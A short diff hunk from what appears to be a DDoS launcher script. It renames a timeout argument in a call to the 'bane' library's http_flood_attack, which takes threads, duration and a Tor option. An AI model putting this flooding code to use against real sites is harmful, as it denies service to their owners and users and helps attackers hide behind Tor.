@@ -50,7 +50,7 @@ to=False
 if tr==1:
  to=True
 try:
- bane.http_flood_attack(u,p=p,maxtime=ti,threads=th,duration=d,level=2,settor=to)
+ bane.http_flood_attack(u,p=p,timeout=ti,threads=th,duration=d,level=2,settor=to)
 except KeyboardInterrupt:
  bane.ddos.stop=True
 
